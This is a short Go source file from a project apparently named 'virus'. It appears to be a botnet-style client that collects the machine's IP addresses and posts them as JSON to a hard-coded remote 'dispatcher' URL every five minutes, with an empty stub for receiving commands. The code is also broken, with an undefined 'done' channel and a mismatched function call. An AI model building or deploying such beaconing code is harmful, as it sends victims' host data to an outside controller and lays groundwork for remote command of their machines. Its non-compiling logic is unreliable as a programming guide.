package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kolya59/virus/pkg/machine"
)

const (
	dispatcherHost = "https://dispatcher-eujhpoji7a-lz.a.run.app"
)

var (
	interval = 5 * time.Minute
	timeout  = 120 * time.Minute
)

func sendData(machine machine.Machine) error {
	// Marshal data
	raw, err := json.Marshal(machine)
	if err != nil {
		return err
	}

	// Set up a connection to dispatcher.
	resp, err := http.Post(fmt.Sprintf("%s/machine", dispatcherHost), "application/json", bytes.NewBuffer(raw))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return err
	}
	return nil
}

func subscribeForCommands(ctx context.Context) {

}

func main() {
	m := machine.Machine{}
	m.GetIPS()

	ticker := time.NewTicker(interval)
	timer := time.NewTimer(timeout)

	ctx := context.Background()
	sendData(m)

	ctx.Err()
	for {
		select {
		case <-ticker.C:
			sendData(m, done)
		case <-timer.C:
			return
		case <-done:
			return
		}
	}
}
